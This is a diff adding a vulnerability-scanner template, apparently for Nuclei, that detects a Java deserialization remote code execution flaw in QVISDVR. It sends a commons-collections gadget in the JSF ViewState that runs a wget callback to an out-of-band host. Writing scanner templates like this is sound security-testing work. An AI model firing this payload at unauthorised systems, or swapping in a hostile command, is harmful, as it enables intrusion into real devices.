@@ -1,0 +1,50 @@
+id: qvisdvr-deserialization-rce
+
+info:
+  author: me9187
+  name: QVISDVR JSF Deserialization - Remote Code Execution
+  severity: critical
+  reference: https://twitter.com/Me9187/status/1414606876575162373
+  tags: qvisdvr,rce,deserialization,jsf,iot
+
+requests:
+  - raw:
+      - |
+        GET /qvisdvr/ HTTP/1.1
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9
+        Content-Type: application/x-www-form-urlencoded
+      - |
+        POST /qvisdvr/index.faces;jsessionid={{token}} HTTP/1.1
+        Accept-Encoding: gzip, deflate
+        Content-Length: 1884
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+        Content-Type: application/x-www-form-urlencoded
+
+        javax.faces.ViewState={{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}")}}
+
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        internal: true
+        part: header
+        regex:
+          - "JSESSIONID=(.*)"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - http
